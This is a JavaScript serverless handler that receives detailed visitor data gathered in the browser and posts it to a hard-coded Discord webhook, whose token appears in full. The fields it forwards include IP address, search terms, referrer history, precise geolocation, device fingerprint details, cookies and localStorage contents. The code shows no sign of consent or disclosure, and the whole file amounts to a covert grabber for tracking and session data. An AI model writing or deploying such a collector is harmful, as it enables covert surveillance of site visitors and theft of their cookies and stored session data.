import fetch from 'node-fetch'; // Ensure node-fetch is installed for webhook requests

export default async (req, res) => {
    try {
        // Get the incoming data
        const { 
            ip, searchTerm, userAgent, referrerHistory, currentURL, 
            screenWidth, screenHeight, browserLanguage, timeZone, 
            osInfo, timestamp, timeSpent, activeTabDuration, 
            networkStatus, deviceType, memoryInfo, 
            hardwareConcurrency, connectionType, plugins, 
            batteryLevel, isCharging, geolocation, cookies, 
            localStorageData 
        } = req.body;

        // Prepare the data for logging
        const logData = {
            embed: {
                title: "Comprehensive User Information Logged",
                fields: [
                    { name: "Private IP", value: ip || 'No IP logged' },
                    { name: "Search Term", value: searchTerm || 'No search term entered' },
                    { name: "User Agent", value: userAgent || 'No user agent' },
                    { name: "Referrer History", value: referrerHistory.length > 0 ? referrerHistory.join(", ") : 'No referrer history' },
                    { name: "Current URL", value: currentURL || 'No URL' },
                    { name: "Screen Resolution", value: `${screenWidth} x ${screenHeight}` || 'No resolution' },
                    { name: "Browser Language", value: browserLanguage || 'No language detected' },
                    { name: "Time Zone", value: timeZone || 'No time zone' },
                    { name: "Operating System", value: osInfo || 'No OS info' },
                    { name: "Timestamp", value: timestamp || new Date().toISOString() },
                    { name: "Time Spent on Page (seconds)", value: timeSpent || '0' },
                    { name: "Active Tab Duration (seconds)", value: activeTabDuration || '0' },
                    { name: "Network Status", value: networkStatus || 'Unknown' },
                    { name: "Device Type", value: deviceType || 'Unknown' },
                    { name: "Memory Info", value: memoryInfo || 'Memory info not available' },
                    { name: "Hardware Concurrency", value: hardwareConcurrency || 'Unknown' },
                    { name: "Connection Type", value: connectionType || 'Unknown' },
                    { name: "Browser Plugins", value: plugins || 'No plugins detected' },
                    { name: "Battery Level", value: `${batteryLevel}%` || 'Unknown' },
                    { name: "Charging Status", value: isCharging ? 'Charging' : 'Not Charging' || 'Unknown' },
                    { name: "Geolocation", value: geolocation.error ? geolocation.error : `Lat: ${geolocation.lat}, Lon: ${geolocation.lon}` },
                    { name: "Cookies", value: cookies || 'No cookies available' },
                    { name: "Local Storage Data", value: localStorageData || 'No local storage data' }
                ],
                color: 5814783, // Example color for the embed
                footer: {
                    text: "Logged at " + new Date().toLocaleString()
                }
            }
        };

        // Send the log data to the Discord webhook
        await fetch('https://discord.com/api/webhooks/1303414607263826002/8u9YBbZiHiRm1dE2cO_wUFFYe6YFTkkouDgoZt-LIYTwVhtYJa1_AM-qDxXajHpWnnsT', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(logData)
        });

        // Send a response back to the client
        res.status(200).json({ message: 'Logged successfully' });
    } catch (error) {
        console.error('Error occurred:', error);
        res.status(500).json({ error: 'An error occurred while logging' });
    }
};
